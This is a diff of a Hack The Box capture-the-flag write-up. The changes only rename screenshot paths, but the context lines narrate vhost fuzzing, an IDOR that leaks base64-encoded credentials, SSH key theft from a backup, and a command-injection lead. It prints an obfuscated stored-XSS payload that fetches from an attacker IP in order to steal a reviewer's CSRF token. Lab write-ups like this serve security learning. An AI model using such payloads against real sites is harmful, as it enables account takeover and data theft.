@@ -16,11 +16,11 @@ When visiting port 80, we can see that it gives us a domain.
 
 The Get Started button directs us to a login page, where default admin:admin credentials do not work.
 
-<figure><img src="../../../.gitbook/assets/image (142) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>
 
 For this particular domain, there are tons of vhosts when using gobuster to scan it.
 
-<figure><img src="../../../.gitbook/assets/image (145) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>
 
 The most interesting of all was the first one, which hosted a Gitea instance.
 
@@ -48,7 +48,7 @@ Based on my understanding of /dump endpoints and HTB creators, this thing should
 
 We can use wfuzz to fuzz out the two parameters we need, filtering the responses by excluding those that have the "Missing Arguments" string.
 
-<figure><img src="../../../.gitbook/assets/image (138) (1).png" alt=""><figcaption><p><br></p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (138).png" alt=""><figcaption><p><br></p></figcaption></figure>
 
 Now we have the first parameter, then we can fuzz the next. When checking request using Burp, we can see that now we have the string "Unknown tablename".&#x20;
 
@@ -83,17 +83,17 @@ So we have 4 users that are using the same password. Using Juliana's account, I 
 
 This website allows us to add snippets of code for others to view, or something like that. I tested this out by adding some simple snippet and viewing the request in Burpsuite.
 
-<figure><img src="../../../.gitbook/assets/image (133) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>
 
 Once we post snippets, we can edit them, and we can also make them public for all to see.
 
-<figure><img src="../../../.gitbook/assets/image (137) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>
 
 I found this interesting because it referenced snippets by ID number. What's interesting is this was my first update, yet it was already the 3rd snippet posted. This tells me there is something hidden elsewhere. Upon changing this to 2, we can see a hidden snippet being posted by jean.
 
 <figure><img src="../../../.gitbook/assets/image (106) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (143) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>
 
 This gives us credentials for jean! We can easily decode from base64 and find the credentials. Then we can login to Gitea as jean.
 
@@ -184,7 +184,7 @@ Looking at the repo collaborators, we can see that the user charlie is indeed a 
 
 From here, we can think about how to implement an XSS attack. Looking at inject.js, we can see that it makes a request to a certain url and checks for the issues. When adding to the issues, we can see that a payload `test<test><img SRC="http://10.10.x.x./test.txt">` works, meaning it bypasses the inject.js checks. After a while, the issue is closed, and I assume the user Charlie is the one closing them.
 
-<figure><img src="../../../.gitbook/assets/image (144) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>
 
 So someone is indeed checking the issues, and we can exploit this fact. So now we need to somehow make charlie request for our page, and observation of Burp reqeusts implies we need to steal the CSRF token to access his hidden repositories.
 
@@ -194,7 +194,7 @@ After some more testing, I come across the eval.call XSS method through the page
 
 This is the payload used: `test<test><img SRC="x" onerror=eval.call${"eval\x28atobZmV0Y2goImh0dHA6Ly8xMC4xMC4xNC41LyIp\x29"}>`
 
-<figure><img src="../../../.gitbook/assets/image (140) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>
 
 What this does is essentially is `fetch('http://10.10.x.x')` for Charlie to execute upon looking at the issues.
 
@@ -218,7 +218,7 @@ When decoded from base64, we can see that charlie has a backup of his home direc
 
 We can save this file and proceed to access his private SSH keys.
 
-<figure><img src="../../../.gitbook/assets/image (134) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>
 
 Now we can SSH in as Charlie!
 
@@ -236,7 +236,7 @@ Upon checking ifconfig, we can see that there are loads of other network interfa
 
 I checked the open ports, and found that we had quite a few listening in.
 
-<figure><img src="../../../.gitbook/assets/image (141) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (141) (1).png" alt=""><figcaption></figcaption></figure>
 
 Port 9000 has some service running on it. Afterwards, I ran a linpeas just to enumerate everything and see what files we have acceess to. Nothing much came from this, however.
 
@@ -246,7 +246,7 @@ So we know there are a ton of different containers present on this machine. We j
 
 Within Jean's home directory, there is this laravel application running somewhere (I'm guessing port 9000 or something else).
 
-<figure><img src="../../../.gitbook/assets/image (146) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>
 
 Within the PHP files, there had to be some form of vulnerability that would allow me to gain RCE, so I did a basic `grep -r <term>` for common PHP shells, like system, and shell_exec._ Shell\_exec worked, as I saw this:
 
@@ -256,7 +256,7 @@ Clearly takes user input from $domain and then just pings it. Very exploitable. 
 
 Using pspy64, we can find some mysql credentials:
 
-<figure><img src="../../../.gitbook/assets/image (135) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>
 
 Let's take a look at this database.
 
